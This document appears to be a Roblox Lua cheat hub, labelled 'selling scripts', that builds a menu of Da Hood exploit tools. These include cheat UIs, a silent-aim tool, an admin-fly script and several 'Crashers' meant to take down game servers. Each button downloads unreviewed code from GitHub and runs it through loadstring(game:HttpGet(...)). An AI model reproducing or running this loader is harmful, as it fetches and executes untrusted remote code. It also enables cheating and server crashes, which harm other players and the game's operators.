local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({
    Name = "selling scripts", 
    HidePremium = true,
    SaveConfig = true,
    ConfigFolder = "chiiicken#3436"
})

local DaHoodUIs = Window:MakeTab({
	Name = "DaHood UIs",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local CrashingGUIS = Window:MakeTab({
	Name = "Crashers",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local devScripts = Window:MakeTab({
	Name = "dev scripts",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local otherScripts = Window:MakeTab({
	Name = "other scripts",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

-----------------------------------------------------------------
-----------------------------------------------------------------
-----------------------------------------------------------------
-----------------------------------------------------------------


---------------- DaHood UIs  ------------------------------------
local DaHoodUISection = DaHoodUIs:AddSection({
	Name = "DaHood UIs"
})

DaHoodUISection:AddButton({
    Name = "Encrypt",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/encryptgui.lua"))()
    end
})

DaHoodUISection:AddButton({
    Name = "Iku",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/W9K/roblox-scripts/main/DHC/SimpleSeller.lua', true))()
    end
})

DaHoodUISection:AddButton({
	Name = "Swagmode V2",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()
  	end    
})

DaHoodUISection:AddButton({
    Name = "Faded",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))()
    end
})

DaHoodUISection:AddButton({
    Name = "Destiny",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/compwnter/destiny/main/loader"))()
    end
})

DaHoodUISection:AddButton({
    Name = "Faded Grid",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded-Grid/main/YesEpic", true))()
    end
})

DaHoodUISection:AddButton({
    Name = "Faded Silent-Aim",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/FadedLock/main/YesEpic"))()
    end
})


---------------- Crashing UIs  ------------------------------------

CrashingGUIS:AddButton({
    Name = "Encrypt Crasher",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua"))()
    end
})

CrashingGUIS:AddButton({
    Name = "Swagmode Crasher",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
    end
})

CrashingGUIS:AddButton({
    Name = "BetterDaHood Crasher",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/BetterDaHood/BetterDaHoodCrasher/main/Crash'))()
    end
})

CrashingGUIS:AddButton({
    Name = "Faded Crasher",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/FadedCrash/main/YesEpic"))() 
    end
})


CrashingGUIS:AddButton({
    Name = "Encrypt 15 Minute Crasher",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dhcquickcrash.lua"))()
    end
})



---------------- Crashing UIs  ------------------------------------






---------------- Crashing UIs  ------------------------------------


otherScripts:AddButton({
    Name = "Iku Money Counter",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/OG5/IkuScripts/main/DH/MoneyCounter', true))()
    end
})

otherScripts:AddButton({
    Name = "Swagmode Admin Fly",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/22kristina/swag/main/admin_fly'))()
    end
})







--- FINAL

OrionLib:Init()